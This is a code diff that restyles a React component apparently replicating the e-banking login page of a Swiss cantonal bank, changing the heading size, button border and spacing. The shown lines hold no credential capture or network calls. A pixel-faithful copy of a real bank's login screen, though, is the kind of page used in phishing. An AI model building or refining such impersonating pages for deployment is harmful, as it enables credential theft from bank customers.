@@ -68,7 +68,7 @@ const ChSchwyzerKantonalbank = () => {
 
           {/* Login card */}
           <div className="mt-6 bg-white rounded-[6px] px-6 py-6 md:px-8 md:py-8">
-            <h1 className="text-[20px] md:text-[24px] font-bold text-black mb-6">
+            <h1 className="text-[26px] md:text-[32px] font-bold text-black mb-6">
               Anmeldung E-Banking
             </h1>
 
@@ -118,14 +118,14 @@ const ChSchwyzerKantonalbank = () => {
                       color: canSubmit ? "#ffffff" : "#bab7b5",
                       cursor: canSubmit ? "pointer" : "not-allowed",
                     }}
-                    className="w-full md:w-auto px-10 h-[44px] border rounded-[6px] text-[15px] font-medium transition-colors"
+                    className="w-full md:w-auto px-10 h-[44px] border-2 rounded-[6px] text-[15px] font-medium transition-colors"
                   >
                     Anmelden
                   </button>
                 </div>
               </div>
 
-              <div className="grid grid-cols-1 md:grid-cols-[180px_1fr] gap-2 md:gap-4 pt-2">
+              <div className="grid grid-cols-1 md:grid-cols-[180px_1fr] gap-2 md:gap-4 -mt-6 md:mt-0 md:pt-2">
                 <a
                   href="#"
                   onClick={(e) => e.preventDefault()}
